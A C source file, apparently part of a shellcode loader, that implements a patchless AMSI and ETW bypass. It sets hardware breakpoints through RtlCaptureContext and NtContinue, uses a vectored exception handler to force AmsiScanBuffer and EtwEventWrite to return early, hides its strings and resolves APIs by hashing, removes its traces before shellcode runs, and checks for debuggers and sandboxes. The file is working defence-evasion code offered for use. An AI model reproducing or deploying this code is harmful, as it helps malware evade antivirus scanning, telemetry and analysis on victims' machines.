// =============================================
// Evasion.c - Patchless AMSI/ETW Bypass
//             (VEH + Hardware Breakpoints + NtContinue)
//             Anti-Analysis
//             Post-execution Cleanup
// =============================================

#include "Common.h"

// Global target addresses for VEH handler
static PVOID g_pEtwEventWrite   = NULL;
static PVOID g_pAmsiScanBuffer  = NULL;

// VEH handle for cleanup
static PVOID g_hVeh = NULL;

// Guard flag: prevents infinite NtContinue loop
static volatile BOOL g_bHwBpSet = FALSE;

// -----------------------------------------------
// Vectored Exception Handler
// Catches STATUS_SINGLE_STEP (hardware breakpoint hit)
// and makes the target function "return" immediately
// without writing any bytes to code memory.
//
// EDR integrity checks see unmodified ntdll/amsi code.
// -----------------------------------------------
static LONG WINAPI HwBpVehHandler(PEXCEPTION_POINTERS pExInfo) {

    if (pExInfo->ExceptionRecord->ExceptionCode != STATUS_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    PCONTEXT ctx = pExInfo->ContextRecord;

    // EtwEventWrite hit -> return STATUS_SUCCESS (0)
    if (g_pEtwEventWrite && ctx->Rip == (ULONG_PTR)g_pEtwEventWrite) {
        ctx->Rax = 0;
        ctx->Rip = *(ULONG_PTR*)ctx->Rsp;
        ctx->Rsp += sizeof(ULONG_PTR);
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    // AmsiScanBuffer hit -> return E_INVALIDARG
    // Callers that check HRESULT will skip the scan result entirely
    if (g_pAmsiScanBuffer && ctx->Rip == (ULONG_PTR)g_pAmsiScanBuffer) {
        ctx->Rax = 0x80070057;  // E_INVALIDARG
        ctx->Rip = *(ULONG_PTR*)ctx->Rsp;
        ctx->Rsp += sizeof(ULONG_PTR);
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

// -----------------------------------------------
// Patchless AMSI/ETW Bypass
//
// Sets hardware breakpoints (DR0/DR1) on EtwEventWrite
// and AmsiScanBuffer using RtlCaptureContext + NtContinue.
//
// NtContinue sets debug registers without ETW-TI
// telemetry (unlike NtSetContextThread which is logged).
//
// VEH handler intercepts the breakpoint exceptions and
// makes the functions "return" with benign values.
//
// Zero bytes of code are modified — fully patchless.
// -----------------------------------------------
BOOL PatchlessAmsiEtw(IN PAPI_HASHING pApi) {

    // --- Resolve target function addresses ---

    BYTE xNtdll[] = XSTR_NTDLL_DLL;
    DEOBF(xNtdll);
    PVOID pNtdll = pApi->pGetModuleHandleA((LPCSTR)xNtdll);
    if (!pNtdll)
        return FALSE;

    BYTE xEtw[] = XSTR_ETW_EVENT_WRITE;
    DEOBF(xEtw);
    g_pEtwEventWrite = (PVOID)pApi->pGetProcAddress((HMODULE)pNtdll, (LPCSTR)xEtw);
    if (!g_pEtwEventWrite)
        return FALSE;

    BYTE xAmsiDll[] = XSTR_AMSI_DLL;
    DEOBF(xAmsiDll);
    HMODULE hAmsi = pApi->pLoadLibraryA((LPCSTR)xAmsiDll);
    if (!hAmsi)
        return FALSE;

    BYTE xAmsiFunc[] = XSTR_AMSI_SCAN_BUFFER;
    DEOBF(xAmsiFunc);
    g_pAmsiScanBuffer = (PVOID)pApi->pGetProcAddress(hAmsi, (LPCSTR)xAmsiFunc);
    if (!g_pAmsiScanBuffer)
        return FALSE;

    // --- Resolve VEH / Context APIs from ntdll ---

    BYTE xVeh[] = XSTR_RTL_ADD_VEH;
    DEOBF(xVeh);
    fnRtlAddVectoredExceptionHandler pRtlAddVeh =
        (fnRtlAddVectoredExceptionHandler)pApi->pGetProcAddress((HMODULE)pNtdll, (LPCSTR)xVeh);
    if (!pRtlAddVeh)
        return FALSE;

    BYTE xCapCtx[] = XSTR_RTL_CAPTURE_CTX;
    DEOBF(xCapCtx);
    fnRtlCaptureContext pRtlCaptureCtx =
        (fnRtlCaptureContext)pApi->pGetProcAddress((HMODULE)pNtdll, (LPCSTR)xCapCtx);
    if (!pRtlCaptureCtx)
        return FALSE;

    BYTE xNtCont[] = XSTR_NT_CONTINUE;
    DEOBF(xNtCont);
    fnNtContinue pNtContinue =
        (fnNtContinue)pApi->pGetProcAddress((HMODULE)pNtdll, (LPCSTR)xNtCont);
    if (!pNtContinue)
        return FALSE;

    // --- Register VEH (first handler in chain) ---

    g_hVeh = pRtlAddVeh(1, (PVOID)HwBpVehHandler);
    if (!g_hVeh)
        return FALSE;

    LOG("[+] Patchless: VEH registered");

    // --- Set hardware breakpoints via RtlCaptureContext + NtContinue ---
    // RtlCaptureContext captures the current thread context (including RIP).
    // We modify DR0/DR1/DR7 in the captured context and call NtContinue,
    // which restores the context with our debug register values and
    // resumes execution at the instruction after RtlCaptureContext.
    //
    // The guard flag g_bHwBpSet prevents the infinite loop:
    //   1st pass: g_bHwBpSet=FALSE -> set to TRUE, modify ctx, NtContinue
    //   2nd pass: g_bHwBpSet=TRUE  -> skip, fall through

    CONTEXT ctx;
    MemSet(&ctx, 0, sizeof(ctx));
    pRtlCaptureCtx(&ctx);

    if (!g_bHwBpSet) {
        g_bHwBpSet = TRUE;

        ctx.Dr0 = (ULONG_PTR)g_pEtwEventWrite;     // DR0 = EtwEventWrite
        ctx.Dr1 = (ULONG_PTR)g_pAmsiScanBuffer;    // DR1 = AmsiScanBuffer
        ctx.Dr7 = (1 << 0) | (1 << 2);             // L0 + L1: local enable, execute-on-1-byte

        ctx.ContextFlags |= CONTEXT_DEBUG_REGISTERS;
        pNtContinue(&ctx, FALSE);
        // Unreachable — NtContinue resumes at pRtlCaptureCtx's return point
    }

    LOG("[+] Patchless: HW breakpoints set (DR0=ETW, DR1=AMSI)");
    return TRUE;
}

// -----------------------------------------------
// Cleanup Evasion State
//
// Removes VEH handler and clears target addresses.
// Called before shellcode execution to reduce
// forensic footprint in memory.
// -----------------------------------------------
VOID CleanupEvasion(IN PAPI_HASHING pApi) {

    if (!g_hVeh || !pApi)
        return;

    // Resolve RtlRemoveVectoredExceptionHandler
    BYTE xNtdll[] = XSTR_NTDLL_DLL;
    DEOBF(xNtdll);
    PVOID pNtdll = pApi->pGetModuleHandleA((LPCSTR)xNtdll);
    if (!pNtdll)
        return;

    BYTE xRemVeh[] = XSTR_RTL_REMOVE_VEH;
    DEOBF(xRemVeh);
    fnRtlRemoveVectoredExceptionHandler pRtlRemoveVeh =
        (fnRtlRemoveVectoredExceptionHandler)pApi->pGetProcAddress(
            (HMODULE)pNtdll, (LPCSTR)xRemVeh);

    if (pRtlRemoveVeh)
        pRtlRemoveVeh(g_hVeh);

    // Clear all evasion state
    g_hVeh             = NULL;
    g_pEtwEventWrite   = NULL;
    g_pAmsiScanBuffer  = NULL;
    g_bHwBpSet         = FALSE;

    LOG("[+] Evasion cleanup: VEH removed, state cleared");
}

// -----------------------------------------------
// Anti-Analysis Checks
// Returns TRUE if environment is clean
// -----------------------------------------------
BOOL AntiAnalysis(VOID) {

    PPEB2 pPeb = (PPEB2)__readgsqword(0x60);
    if (!pPeb) {
        LOG("  [AA] PEB is NULL");
        return FALSE;
    }

    // 1. Check PEB->BeingDebugged
    if (pPeb->BeingDebugged) {
        LOG("  [AA] BLOCKED: BeingDebugged=TRUE");
        return FALSE;
    }
    LOG("  [AA] BeingDebugged: OK");

    // 2. Check NtGlobalFlag
    if (pPeb->NtGlobalFlag & 0x70) {
        LOG("  [AA] BLOCKED: NtGlobalFlag has debug flags");
        return FALSE;
    }
    LOG("  [AA] NtGlobalFlag: OK");

    // 3. Check number of processors (sandboxes often have 1)
    if (pPeb->NumberOfProcessors < 2) {
        LOG("  [AA] BLOCKED: NumberOfProcessors < 2");
        return FALSE;
    }
    LOG("  [AA] NumberOfProcessors: OK");

    // 4. Timing check
    ULONGLONG tsc1 = __rdtsc();
    volatile int dummy = 0;
    for (int i = 0; i < 100; i++) dummy += i;
    ULONGLONG tsc2 = __rdtsc();

    if ((tsc2 - tsc1) > 10000000) {
        LOG("  [AA] BLOCKED: RDTSC timing anomaly");
        return FALSE;
    }
    LOG("  [AA] RDTSC: OK");

    return TRUE;
}
